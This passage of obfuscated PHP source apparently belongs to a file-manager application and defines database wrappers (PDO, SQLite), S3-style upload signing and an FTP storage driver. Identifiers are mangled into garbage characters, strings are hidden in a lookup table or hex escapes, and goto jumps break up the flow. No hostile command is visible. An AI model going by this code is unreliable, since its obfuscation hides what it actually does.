$Ç®è³ş[$Šµ¢Ô¯[$¼…çÍÉ³[2031]][$¼…çÍÉ³[1783]]]; } } unset($Šµ¢Ô¯); } private function _listAppendMeta(&$ĞÔŞï) { $Ÿ¾­¶Ïí =& $_SERVER[¼’ç§¼´]; $É±—Œüµ = array_unique(array_to_keyvalue($ĞÔŞï, $Ÿ¾­¶Ïí[12], $Ÿ¾­¶Ïí[2021])); $É±—Œüµ = array_remove_value($É±—Œüµ, $Ÿ¾­¶Ïí[230]); if (!$É±—Œüµ) { return; } foreach ($ĞÔŞï as $óÔÀŞ Ø) { if (isset($óÔÀŞ Ø[$Ÿ¾­¶Ïí[2031]])) { $É±—Œüµ[] = $óÔÀŞ Ø[$Ÿ¾­¶Ïí[2031]][$Ÿ¾­¶Ïí[2021]]; } } $ì„”ä‡¦ = $this->metaList($É±—Œüµ); if (!$ì„”ä‡¦) { return !1; } foreach ($ĞÔŞï as &$óÔÀŞ Ø) { $óÔÀŞ Ø[$Ÿ¾­¶Ïí[550]] = $ì„”ä‡¦[$óÔÀŞ Ø[$Ÿ¾­¶Ïí[2021]]]; if (isset($óÔÀŞ Ø[$Ÿ¾­¶Ïí[2031]])) { $óÔÀŞ Ø[$Ÿ¾­¶Ïí[2031]][$Ÿ¾­¶Ïí[550]] = $ì„”ä‡¦[$óÔÀŞ Ø[$Ÿ¾­¶Ïí[2031]][$Ÿ¾­¶Ïí[2021]]]; } } unset($óÔÀŞ Ø); } private function metaList($ˆÄÖ“œƒ) { $Çøº“  =& $_SERVER[¼’ç§¼´]; if (!$ˆÄÖ“œƒ) { return array(); } $ÚÚÏŒ¸Ÿ = array($Çøº“ [2021] => array($Çøº“ [7], $ˆÄÖ“œƒ)); $…àª¸ÀÓ = Model($Çøº“ [2032])->where($ÚÚÏŒ¸Ÿ)->select(); $…àª¸ÀÓ = array_to_keyvalue_group($…àª¸ÀÓ, $Çøº“ [2021]); foreach ($…àª¸ÀÓ as $ü÷¨ÛñË => $œÜ£ïçÜ) { $Ñë¸µ« = array(); foreach ($œÜ£ïçÜ as $ÉŠİØÎ°) { $Ñë¸µ«[$ÉŠİØÎ°[$Çøº“ [97]]] = $ÉŠİØÎ°[$Çøº“ [461]]; } $…àª¸ÀÓ[$ü÷¨ÛñË] = $Ñë¸µ«; } return $…àª¸ÀÓ ? $…àª¸ÀÓ : array(); } public function removeTarget($ªıßìû¼, $¸…®âæ) { $óÅ°Ç¾À =& $_SERVER[¼’ç§¼´]; if (!$¸…®âæ) { return !0; } $¸…®âæ = is_array($¸…®âæ) ? $¸…®âæ : array($¸…®âæ); $×‘İÉ˜Â = array($óÅ°Ç¾À[190] => $ªıßìû¼, $óÅ°Ç¾À[580] => array($óÅ°Ç¾À[7], $¸…®âæ)); $Ó°€É– = $this->field($óÅ°Ç¾À[2021])->where($×‘İÉ˜Â)->select(); $úé‹„ˆŞ = array_to_keyvalue($Ó°€É–, $óÅ°Ç¾À[12], $óÅ°Ç¾À[2021]); if (!$úé‹„ˆŞ) { return !0; } $×‘İÉ˜Â = array($óÅ°Ç¾À[2021] => array($óÅ°Ç¾À[7], $úé‹„ˆŞ)); $this->where($×‘İÉ˜Â)->delete(); Model($óÅ°Ç¾À[2024])->where($×‘İÉ˜Â)->delete(); Model($óÅ°Ç¾À[2033])->where($×‘İÉ˜Â)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\x6c\145\x5f\x63\157\156\164\145\156\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\151\155\145", "\x74\151\155\145", "\151\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\156")); } goto d‰ÌÜø¼Î; BšÀ½Šæ…õ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ô¥§ğªÊ = '') { $Œ™û‹´Â =& $_SERVER[¼’ç§¼´]; if (!class_exists($Œ™û‹´Â[1000])) { think_exception(think_lang($Œ™û‹´Â[14]) . $Œ™û‹´Â[1001]); } if (!empty($Ô¥§ğªÊ)) { $this->config = $Ô¥§ğªÊ; if (empty($this->config[$Œ™û‹´Â[17]])) { $this->config[$Œ™û‹´Â[17]] = array(); } } } public function connect($½±îİØ = '', $íÌÔ¾î­ = 0) { $‹“æ­îå =& $_SERVER[¼’ç§¼´]; if (!isset($this->linkID[$íÌÔ¾î­])) { if (empty($½±îİØ)) { $½±îİØ = $this->config; } $ã«¢Î = !empty($½±îİØ[$‹“æ­îå[17]][$‹“æ­îå[18]]) ? $½±îİØ[$‹“æ­îå[17]][$‹“æ­îå[18]] : $this->pconnect; if ($ã«¢Î) { $½±îİØ[$‹“æ­îå[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$íÌÔ¾î­] = new PDO($½±îİØ[$‹“æ­îå[1002]], $½±îİØ[$‹“æ­îå[974]], $½±îİØ[$‹“æ­îå[975]], $½±îİØ[$‹“æ­îå[17]]); } catch (PDOException $‡„œŒê) { think_exception($‡„œŒê->getMessage()); } $this->dbType = $this->_getDsnType($½±îİØ[$‹“æ­îå[1002]]); if (in_array($this->dbType, array($‹“æ­îå[1003], $‹“æ­îå[1004], $‹“æ­îå[1005], $‹“æ­îå[1006]))) { think_exception($‹“æ­îå[1007] . $this->dbType . $‹“æ­îå[1008] . $this->dbType . $‹“æ­îå[1009]); } if (!$this->linkID[$íÌÔ¾î­]) { think_exception($‹“æ­îå[1010]); } try { $this->linkID[$íÌÔ¾î­]->exec($‹“æ­îå[1011] . think_config($‹“æ­îå[977])); } catch (Exception $‡„œŒê) { } $this->connected = !0; if (1 != think_config($‹“æ­îå[22])) { unset($this->config); } } return $this->linkID[$íÌÔ¾î­]; } public function free() { $this->PDOStatement = null; } public function query($‰ÎÌ™ÕÇ, $Ìõ½ùÈ = array()) { $áİ½ÀøÔ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰ÎÌ™ÕÇ; if (!empty($Ìõ½ùÈ)) { $this->queryStr .= $áİ½ÀøÔ[1012] . print_r($Ìõ½ùÈ, !0) . $áİ½ÀøÔ[1013]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($áİ½ÀøÔ[23], 1); think_status($áİ½ÀøÔ[24]); $this->PDOStatement = $this->_linkID->prepare($‰ÎÌ™ÕÇ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÈÈˆÛ = $this->PDOStatement->execute($Ìõ½ùÈ); $this->debug(); if (!1 === $ÈÈˆÛ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¥¢Æ†½§, $òäËÉ…ª = array()) { $ÕÛßúä =& $_SERVER[¼’ç§¼´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¥¢Æ†½§; if (!empty($òäËÉ…ª)) { $this->queryStr .= $ÕÛßúä[1012] . print_r($òäËÉ…ª, !0) . $ÕÛßúä[1013]; } $¸Ç¨ §ğ = !1; if ($this->dbType == $ÕÛßúä[1006]) { if (preg_match($ÕÛßúä[1014], $this->queryStr, $¾°§Äœñ)) { $this->table = think_config($ÕÛßúä[1015]) . str_ireplace(think_config($ÕÛßúä[1016]), $ÕÛßúä[465], $¾°§Äœñ[2]); $¸Ç¨ §ğ = (bool) $this->query($ÕÛßúä[1017] . strtoupper($this->table) . $ÕÛßúä[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÕÛßúä[25], 1); think_status($ÕÛßúä[24]); $this->PDOStatement = $this->_linkID->prepare($¥¢Æ†½§); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $€òÙâş‘ = $this->PDOStatement->execute($òäËÉ…ª); $this->debug(); if (!1 === $€òÙâş‘) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¸Ç¨ §ğ || preg_match($ÕÛßúä[1018], $¥¢Æ†½§)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $î»šÔğ€ = $this->_linkID->commit(); $this->transTimes = 0; if (!$î»šÔğ€) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÜàŠÁæ¯ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÜàŠÁæ¯) { $this->error(); return !1; } } return !0; } private function getAll() { $˜©Èë¡º = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($˜©Èë¡º); return $˜©Èë¡º; } public function getFields($ÛÀĞ½­Í) { $‡ ¶€ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!0); if (think_config($‡ ¶€[1019])) { $ßÃÆæî = str_replace($‡ ¶€[1020], $ÛÀĞ½­Í, think_config($‡ ¶€[1019])); } else { switch ($this->dbType) { case $‡ ¶€[1003]: case $‡ ¶€[1021]: $ßÃÆæî = "\x53\x45\x4c\x45\103\124\40\x20\x20\143\157\x6c\165\155\156\x5f\156\x61\x6d\145\40\x61\x73\40\47\116\141\155\145\x27\54\40\x20\40\144\141\164\x61\137\x74\x79\x70\x65\x20\x61\163\x20\x27\x54\x79\160\145\47\54\40\40\40\x63\x6f\154\165\155\156\137\x64\x65\146\x61\x75\x6c\x74\40\141\x73\40\47\x44\x65\146\x61\165\x6c\x74\47\54\40\x20\40\151\x73\137\x6e\x75\x6c\154\x61\142\x6c\145\x20\x61\163\x20\x27\116\165\154\154\47\xa\x9\x9\x46\122\x4f\x4d\x9\x69\156\x66\157\x72\x6d\141\164\x69\157\x6e\x5f\163\143\150\145\x6d\141\56\164\x61\142\x6c\145\163\x20\101\x53\x20\x74\12\x9\x9\112\x4f\111\116\x9\x69\x6e\146\x6f\x72\x6d\x61\164\151\157\x6e\137\163\x63\150\145\x6d\141\x2e\143\x6f\x6c\165\x6d\156\x73\x20\x41\123\x20\x63\xa\x9\x9\117\x4e\40\40\164\x2e\x74\141\142\154\145\x5f\143\x61\x74\x61\154\x6f\147\40\x3d\x20\x63\x2e\x74\141\x62\154\145\137\x63\141\x74\141\x6c\157\x67\12\11\11\101\x4e\x44\40\164\x2e\x74\x61\142\154\145\x5f\163\143\x68\145\x6d\x61\x20\75\x20\x63\x2e\x74\x61\x62\x6c\x65\x5f\x73\143\x68\x65\155\141\xa\11\x9\x41\x4e\x44\x20\164\56\164\x61\142\154\x65\x5f\x6e\141\155\x65\40\x3d\x20\x63\x2e\x74\141\x62\x6c\145\x5f\x6e\x61\x6d\145\12\x9\11\127\110\x45\x52\105\x20\40\40\x74\x2e\x74\141\x62\154\145\137\x6e\x61\155\x65\40\75\40\47{$ÛÀĞ½­Í}\x27"; break; case $‡ ¶€[1022]: $ßÃÆæî = $‡ ¶€[1023] . $ÛÀĞ½­Í . $‡ ¶€[1024]; break; case $‡ ¶€[1004]: case $‡ ¶€[1006]: $ßÃÆæî = $‡ ¶€[1025] . $‡ ¶€[1026] . $‡ ¶€[1027] . strtoupper($ÛÀĞ½­Í) . $‡ ¶€[1028] . strtoupper($ÛÀĞ½­Í) . $‡ ¶€[1029]; break; case $‡ ¶€[1030]: $ßÃÆæî = $‡ ¶€[1031] . $ÛÀĞ½­Í . $‡ ¶€[1032]; break; case $‡ ¶€[1005]: break; case $‡ ¶€[1033]: default: $ßÃÆæî = $‡ ¶€[1034] . ($this->dbType == $‡ ¶€[1033] ? "\140{$ÛÀĞ½­Í}\140" : $ÛÀĞ½­Í); } } $¥ÅŒƒ Ê = $this->query($ßÃÆæî); $çÂ¶Å… = array(); if ($¥ÅŒƒ Ê) { foreach ($¥ÅŒƒ Ê as $šõì–¸å => $ì±€¯¥á) { $ì±€¯¥á = array_change_key_case($ì±€¯¥á); $ì±€¯¥á[$‡ ¶€[32]] = isset($ì±€¯¥á[$‡ ¶€[32]]) ? $ì±€¯¥á[$‡ ¶€[32]] : $‡ ¶€[465]; $ì±€¯¥á[$‡ ¶€[33]] = isset($ì±€¯¥á[$‡ ¶€[33]]) ? $ì±€¯¥á[$‡ ¶€[33]] : $‡ ¶€[465]; $Ñ›Å½ô• = isset($ì±€¯¥á[$‡ ¶€[352]]) ? $ì±€¯¥á[$‡ ¶€[352]] : $ì±€¯¥á[$‡ ¶€[32]]; $çÂ¶Å…[$Ñ›Å½ô•] = array($‡ ¶€[32] => $Ñ›Å½ô•, $‡ ¶€[33] => $ì±€¯¥á[$‡ ¶€[33]], $‡ ¶€[35] => (bool) (isset($ì±€¯¥á[$‡ ¶€[106]]) && $ì±€¯¥á[$‡ ¶€[106]] === $‡ ¶€[12] || isset($ì±€¯¥á[$‡ ¶€[35]]) && $ì±€¯¥á[$‡ ¶€[35]] === $‡ ¶€[12]), $‡ ¶€[37] => isset($ì±€¯¥á[$‡ ¶€[37]]) ? $ì±€¯¥á[$‡ ¶€[37]] : (isset($ì±€¯¥á[$‡ ¶€[56]]) ? $ì±€¯¥á[$‡ ¶€[56]] : $‡ ¶€[465]), $‡ ¶€[39] => isset($ì±€¯¥á[$‡ ¶€[97]]) ? strtolower($ì±€¯¥á[$‡ ¶€[97]]) == $‡ ¶€[41] : (isset($ì±€¯¥á[$‡ ¶€[57]]) ? $ì±€¯¥á[$‡ ¶€[57]] : !1), $‡ ¶€[42] => isset($ì±€¯¥á[$‡ ¶€[1035]]) ? strtolower($ì±€¯¥á[$‡ ¶€[1035]]) == $‡ ¶€[44] : (isset($ì±€¯¥á[$‡ ¶€[97]]) ? $ì±€¯¥á[$‡ ¶€[97]] : !1)); } } return $çÂ¶Å…; } public function getTables($ªœ„«ªê = '') { $ãö›Õ‹Ê =& $_SERVER[¼’ç§¼´]; if (think_config($ãö›Õ‹Ê[1036])) { $ˆç®¢› = str_replace($ãö›Õ‹Ê[1037], $ªœ„«ªê, think_config($ãö›Õ‹Ê[1036])); } else { switch ($this->dbType) { case $ãö›Õ‹Ê[1004]: case $ãö›Õ‹Ê[1006]: $ˆç®¢› = $ãö›Õ‹Ê[1038]; break; case $ãö›Õ‹Ê[1003]: case $ãö›Õ‹Ê[1021]: $ˆç®¢› = $ãö›Õ‹Ê[1039]; break; case $ãö›Õ‹Ê[1030]: $ˆç®¢› = $ãö›Õ‹Ê[1040]; break; case $ãö›Õ‹Ê[1005]: think_exception(think_lang($ãö›Õ‹Ê[1041]) . $ãö›Õ‹Ê[1042]); break; case $ãö›Õ‹Ê[1022]: $ˆç®¢› = $ãö›Õ‹Ê[45] . $ãö›Õ‹Ê[46] . $ãö›Õ‹Ê[47]; break; case $ãö›Õ‹Ê[1033]: default: if (!empty($ªœ„«ªê)) { $ˆç®¢› = $ãö›Õ‹Ê[985] . $ªœ„«ªê . $ãö›Õ‹Ê[986]; } else { $ˆç®¢› = $ãö›Õ‹Ê[987]; } } } $ÕÔ¼Î“ = $this->query($ˆç®¢›); $‘›êıÅ· = array(); foreach ($ÕÔ¼Î“ as $½§Èé§ø => $•€è¦èú) { $‘›êıÅ·[$½§Èé§ø] = current($•€è¦èú); } return $‘›êıÅ·; } protected function parseLimit($ŸïñšŸÏ) { $î¢¬‹ù’ =& $_SERVER[¼’ç§¼´]; $À–Ê‰Ï„ = $î¢¬‹ù’[12]; if (!empty($ŸïñšŸÏ)) { switch ($this->dbType) { case $î¢¬‹ù’[1030]: case $î¢¬‹ù’[1022]: $ŸïñšŸÏ = explode($î¢¬‹ù’[50], $ŸïñšŸÏ); if (count($ŸïñšŸÏ) > 1) { $À–Ê‰Ï„ .= $î¢¬‹ù’[51] . $ŸïñšŸÏ[1] . $î¢¬‹ù’[52] . $ŸïñšŸÏ[0] . $î¢¬‹ù’[53]; } else { $À–Ê‰Ï„ .= $î¢¬‹ù’[51] . $ŸïñšŸÏ[0] . $î¢¬‹ù’[53]; } break; case $î¢¬‹ù’[1003]: case $î¢¬‹ù’[1021]: break; case $î¢¬‹ù’[1005]: break; case $î¢¬‹ù’[1004]: case $î¢¬‹ù’[1006]: break; case $î¢¬‹ù’[1033]: default: $À–Ê‰Ï„ .= $î¢¬‹ù’[51] . $ŸïñšŸÏ . $î¢¬‹ù’[53]; } } return $À–Ê‰Ï„; } public function parseKey(&$Î¼¹Ó§Ë, $Ô¢èµ›Æ = true) { $—‘ÒÃ° =& $_SERVER[¼’ç§¼´]; if ($Ô¢èµ›Æ) { $Î¼¹Ó§Ë = $this->parseKeyCheck($Î¼¹Ó§Ë); } if ($this->dbType == $—‘ÒÃ°[1033]) { if ($Î¼¹Ó§Ë != $—‘ÒÃ°[222] && !preg_match($—‘ÒÃ°[997], $Î¼¹Ó§Ë)) { $Î¼¹Ó§Ë = $—‘ÒÃ°[472] . trim($Î¼¹Ó§Ë, $—‘ÒÃ°[472]) . $—‘ÒÃ°[472]; } return $Î¼¹Ó§Ë; } else { return parent::parseKey($Î¼¹Ó§Ë, $Ô¢èµ›Æ); } } public function close() { $this->_linkID = null; } public function error() { $á¦“ªı• =& $_SERVER[¼’ç§¼´]; if ($this->PDOStatement) { $öúÑóÕÖ = $this->PDOStatement->errorInfo(); $this->error = $öúÑóÕÖ[1] . $á¦“ªı•[4] . $öúÑóÕÖ[2]; } else { $this->error = $á¦“ªı•[12]; } if ($á¦“ªı•[12] != $this->queryStr) { $this->error .= LNG($á¦“ªı•[48]) . $this->queryStr; } think_trace($this->error, $á¦“ªı•[12], $á¦“ªı•[49]); return $this->error; } public function escapeString($¬Š¼ıû§) { $¤î»Ñ– =& $_SERVER[¼’ç§¼´]; switch ($this->dbType) { case $¤î»Ñ–[1030]: case $¤î»Ñ–[1003]: case $¤î»Ñ–[1021]: case $¤î»Ñ–[1033]: return addslashes($¬Š¼ıû§); case $¤î»Ñ–[1005]: case $¤î»Ñ–[1022]: case $¤î»Ñ–[1004]: case $¤î»Ñ–[1006]: return str_ireplace($¤î»Ñ–[58], $¤î»Ñ–[59], $¬Š¼ıû§); } } protected function parseValue($¤–¢ÏŞŸ) { $èÆ”Á¡Õ =& $_SERVER[¼’ç§¼´]; if (is_string($¤–¢ÏŞŸ)) { $ÒæÀ‰² = strpos($¤–¢ÏŞŸ, $èÆ”Á¡Õ[4]) === 0 && in_array($¤–¢ÏŞŸ, array_keys($this->bind)); $¤–¢ÏŞŸ = $ÒæÀ‰² ? $this->escapeString($¤–¢ÏŞŸ) : $èÆ”Á¡Õ[1043] . $this->escapeString($¤–¢ÏŞŸ) . $èÆ”Á¡Õ[1043]; } elseif (isset($¤–¢ÏŞŸ[0]) && is_string($¤–¢ÏŞŸ[0]) && strtolower($¤–¢ÏŞŸ[0]) == $èÆ”Á¡Õ[374]) { $¤–¢ÏŞŸ = $this->escapeString($¤–¢ÏŞŸ[1]); } elseif (is_array($¤–¢ÏŞŸ)) { $¤–¢ÏŞŸ = array_map(array($this, $èÆ”Á¡Õ[1044]), $¤–¢ÏŞŸ); } elseif (is_bool($¤–¢ÏŞŸ)) { $¤–¢ÏŞŸ = $¤–¢ÏŞŸ ? $èÆ”Á¡Õ[91] : $èÆ”Á¡Õ[230]; } elseif (is_null($¤–¢ÏŞŸ)) { $¤–¢ÏŞŸ = $èÆ”Á¡Õ[106]; } return $¤–¢ÏŞŸ; } public function getLastInsertId() { $“ÁÊ­  =& $_SERVER[¼’ç§¼´]; switch ($this->dbType) { case $“ÁÊ­ [1030]: case $“ÁÊ­ [1022]: case $“ÁÊ­ [1003]: case $“ÁÊ­ [1021]: case $“ÁÊ­ [1005]: case $“ÁÊ­ [1033]: return $this->_linkID->lastInsertId(); case $“ÁÊ­ [1004]: case $“ÁÊ­ [1006]: $£“¯ºŞ± = $this->table; $¯–¾®­ = $this->query("\123\105\x4c\105\103\x54\40{$£“¯ºŞ±}\x2e\x63\x75\162\x72\166\141\x6c\x20\143\x75\162\162\166\x61\x6c\40\106\x52\x4f\x4d\x20\x64\x75\141\154"); return $¯–¾®­ ? $¯–¾®­[0][$“ÁÊ­ [1045]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($§ÖŞöß¨) { $’„Åò¬ =& $_SERVER[¼’ç§¼´]; if (!CacheLock::fileLock($’„Åò¬[13])) { return !1; } $œù©”Üâ = parent::query($§ÖŞöß¨); CacheLock::fileUnLock($’„Åò¬[13]); return $œù©”Üâ; } public function execute($¥†ÒÔÛÑ) { $•´óÎ† =& $_SERVER[¼’ç§¼´]; if (!CacheLock::fileLock($•´óÎ†[13])) { return !1; } $’Øôá€ = parent::execute($¥†ÒÔÛÑ); CacheLock::fileUnLock($•´óÎ†[13]); return $’Øôá€; } } class DbSqlite3 extends DbSqlite3Base { public function query($Í•¥øÔ÷) { $¼…ïş½Õ =& $_SERVER[¼’ç§¼´]; if (!CacheLock::fileLock($¼…ïş½Õ[13])) { return !1; } $«©ºú±¢ = parent::query($Í•¥øÔ÷); CacheLock::fileUnLock($¼…ïş½Õ[13]); return $«©ºú±¢; } public function execute($˜Õ¨ò×°) { $áê¢ü… =& $_SERVER[¼’ç§¼´]; if (!CacheLock::fileLock($áê¢ü…[13])) { return !1; } $ôÓø«¾ = parent::execute($˜Õ¨ò×°); CacheLock::fileUnLock($áê¢ü…[13]); return $ôÓø«¾; } } goto cë„éÑ¤ìÍ; f°äç½Í : class PathDriverEOS extends PathDriverBaseS3 { public function __construct($«ÑŠÓèª) { parent::__construct($«ÑŠÓèª); $this->setSignVersion($_SERVER[¼’ç§¼´][249]); } public function uploadFormData($ƒÁÔ–ø, $ÈÉ»¸°š = 3600) { $…¶Ï®É =& $_SERVER[¼’ç§¼´]; $œ´ÉÀäÆ = $…¶Ï®É[231]; $ÒİİÉÅ± = $…¶Ï®É[259]; $º¬ÌÔë = $…¶Ï®É[62]; $Š¤±×öÜ = gmdate($…¶Ï®É[260]); $™Óî÷Ò = gmdate($…¶Ï®É[261]); $¼ü½¨Ç = $…¶Ï®É[262]; $ä‘ÀÃŸ¦ = $ÈÉ»¸°š . $…¶Ï®É[12]; $Äá¾Ô‡ = $…¶Ï®É[263]; $¢‡ê´Íî = array($this->accessKey, $™Óî÷Ò, $this->region, $º¬ÌÔë, $¼ü½¨Ç); $ÓËØçÑ = implode($…¶Ï®É[8], $¢‡ê´Íî); $âÀºµ…ˆ = array($…¶Ï®É[264] => gmdate($…¶Ï®É[1422], strtotime($…¶Ï®É[266])), $…¶Ï®É[267] => array(array($…¶Ï®É[268] => $this->bucket), array($…¶Ï®É[308] => $œ´ÉÀäÆ), array($…¶Ï®É[269], $…¶Ï®É[270], $…¶Ï®É[12]), array($…¶Ï®É[269], $…¶Ï®É[271], $…¶Ï®É[12]), array($…¶Ï®É[269], $…¶Ï®É[309], $…¶Ï®É[12]), array($…¶Ï®É[272] => $Äá¾Ô‡), array($…¶Ï®É[273] => $ÓËØçÑ), array($…¶Ï®É[274] => $ÒİİÉÅ±), array($…¶Ï®É[275] => $Š¤±×öÜ), array($…¶Ï®É[276] => $ä‘ÀÃŸ¦))); $˜¢™º«š = base64_encode(json_encode($âÀºµ…ˆ)); $ÀÅˆ± = hash_hmac($…¶Ï®É[277], $™Óî÷Ò, $…¶Ï®É[278] . $this->secret, !0); $¹‹¯ÙŠ = hash_hmac($…¶Ï®É[277], $this->region, $ÀÅˆ±, !0); $î‚È·¬Ÿ = hash_hmac($…¶Ï®É[277], $º¬ÌÔë, $¹‹¯ÙŠ, !0); $Ì³«Øß = hash_hmac($…¶Ï®É[277], $¼ü½¨Ç, $î‚È·¬Ÿ, !0); $õ‹Â¥± = hash_hmac($…¶Ï®É[277], $˜¢™º«š, $Ì³«Øß); $’¤çØîğ = array($…¶Ï®É[248] => $…¶Ï®É[12], $…¶Ï®É[296] => $…¶Ï®É[12], $…¶Ï®É[308] => $œ´ÉÀäÆ, $…¶Ï®É[272] => $Äá¾Ô‡, $…¶Ï®É[279] => $˜¢™º«š, $…¶Ï®É[310] => $ÓËØçÑ, $…¶Ï®É[311] => $ÒİİÉÅ±, $…¶Ï®É[312] => $Š¤±×öÜ, $…¶Ï®É[313] => $ä‘ÀÃŸ¦, $…¶Ï®É[314] => $õ‹Â¥±, $…¶Ï®É[208] => $this->getHost()); return $’¤çØîğ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($¡åÏ®—) { parent::__construct(); if (count($¡åÏ®—) > 0) { $this->_init($¡åÏ®—); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($æ©¸¤¹) { $ãÁ­º€Ü =& $_SERVER[¼’ç§¼´]; global $config; $this->appCharset = $config[$ãÁ­º€Ü[1448]]; $this->systemCharset = $config[$ãÁ­º€Ü[1449]]; if (isset($æ©¸¤¹[$ãÁ­º€Ü[1450]]) && $æ©¸¤¹[$ãÁ­º€Ü[1450]]) { $this->systemCharset = $æ©¸¤¹[$ãÁ­º€Ü[1450]]; } } public function iconvApp($¨÷Şæ Î) { return $this->iconvTo($¨÷Şæ Î, $this->systemCharset, $this->appCharset); } public function iconvSystem($÷¶¦ªöÙ) { return $this->iconvTo($÷¶¦ªöÙ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÉÙï¯˜¢) { $²ÕìŒÏ‰ =& $_SERVER[¼’ç§¼´]; $‡ÁÄüåÚ = $this->iconvApp($this->pathBase); $ÉÙï¯˜¢ = $this->iconvApp($ÉÙï¯˜¢); if (substr($‡ÁÄüåÚ, 0, 2) == $²ÕìŒÏ‰[1420]) { $‡ÁÄüåÚ = BASIC_PATH . substr($‡ÁÄüåÚ, 2); } if (substr($ÉÙï¯˜¢, 0, 2) == $²ÕìŒÏ‰[1420]) { $ÉÙï¯˜¢ = BASIC_PATH . substr($ÉÙï¯˜¢, 2); } $‡ÁÄüåÚ = KodIO::clear($‡ÁÄüåÚ); $ÉÙï¯˜¢ = KodIO::clear($ÉÙï¯˜¢); $ÉÙï¯˜¢ = substr($ÉÙï¯˜¢, strlen($‡ÁÄüåÚ)); if (empty($this->pathDriver)) { return $ÉÙï¯˜¢; } return $this->pathDriver . $²ÕìŒÏ‰[8] . ltrim($ÉÙï¯˜¢, $²ÕìŒÏ‰[8]); } private function _init($£ò€ñóÊ = array()) { $ÊéøØ‘€ =& $_SERVER[¼’ç§¼´]; if (!function_exists($ÊéøØ‘€[1451])) { throw new Exception(LNG($ÊéøØ‘€[1452])); } $this->config = $£ò€ñóÊ; $this->charsetReset($£ò€ñóÊ); foreach ($£ò€ñóÊ as $¶¹Ôì¥ => $Ôñ›÷Úæ) { if (isset($this->{$¶¹Ôì¥})) { $this->{$¶¹Ôì¥} = $Ôñ›÷Úæ; } } return $this->_login($£ò€ñóÊ); } private function _login($ç´¨³ œ) { $¨ èÃÚ =& $_SERVER[¼’ç§¼´]; static $²¦¿¥«² = array(); $ğÙü¢Ÿ– = md5(json_encode($ç´¨³ œ)); if (isset($²¦¿¥«²[$ğÙü¢Ÿ–])) { foreach ($²¦¿¥«²[$ğÙü¢Ÿ–] as $‚ğÙóØ => $ íÕİ™¢) { $this->{$‚ğÙóØ} = $ íÕİ™¢; } return !0; } $µ‘¬šÕß = parse_url(trim($this->server, $¨ èÃÚ[8])); $this->host = $µ‘¬šÕß[$¨ èÃÚ[208]]; $¸òîØÁ = isset($µ‘¬šÕß[$¨ èÃÚ[207]]) && $µ‘¬šÕß[$¨ èÃÚ[207]] == $¨ èÃÚ[1453] ? !0 : !1; $this->scheme = $¸òîØÁ ? $¨ èÃÚ[1454] : $¨ èÃÚ[1455]; $this->port = isset($µ‘¬šÕß[$¨ èÃÚ[209]]) ? $µ‘¬šÕß[$¨ èÃÚ[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¨ èÃÚ[1456]) . $this->host . $¨ èÃÚ[4] . $this->port, !0); return !1; } $¥Óûâ½ï = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¥Óûâ½ï) { $this->writeLog(LNG($¨ èÃÚ[1457]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $à›ßæìñ = $this->pasv == $¨ èÃÚ[91] ? !0 : !1; @ftp_pasv($this->connect, $à›ßæìñ); $²¦¿¥«²[$ğÙü¢Ÿ–] = array($¨ èÃÚ[1458] => $this->connect, $¨ èÃÚ[208] => $this->host, $¨ èÃÚ[207] => $this->scheme, $¨ èÃÚ[209] => $this->port); return $¥Óûâ½ï; } private function _isconn($Ÿ‚îë˜ñ = true) { if (is_resource($this->connect)) { return !0; } if (!$Ÿ‚îë˜ñ) { return !1; } return $this->_login($this->config); } public function mkfile($±³‰Ş·Ü, $Øªò€ñâ = '', $œ±ÈÖ€ú = REPEAT_RENAME) { if ($this->setContent($±³‰Ş·Ü, $Øªò€ñâ)) { return $this->getPathOuter($±³‰Ş·Ü); } $this->writeLog(LNG($_SERVER[¼’ç§¼´][1459]), !0); return !1; } public function mkdir($ÇŠşÉµ£, $¡£’ŞÌÀ = REPEAT_SKIP) { $ß“ïú =& $_SERVER[¼’ç§¼´]; if (!$ÇŠşÉµ£ || $ÇŠşÉµ£ == $ß“ïú[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÇŠşÉµ£ = $this->iconvSystem($ÇŠşÉµ£); if ($this->_isFolder($ÇŠşÉµ£) || @ftp_mkdir($this->connect, $ÇŠşÉµ£)) { return $this->getPathOuter($ÇŠşÉµ£); } if (!$this->mkdir($this->pathFather($ÇŠşÉµ£))) { return !1; } if ($ÇŠşÉµ£ = @ftp_mkdir($this->connect, $ÇŠşÉµ£)) { return $this->getPathOuter($ÇŠşÉµ£); } $this->writeLog(__FUNCTION__ . $ß“ïú[1460], !0); return !1; } public function 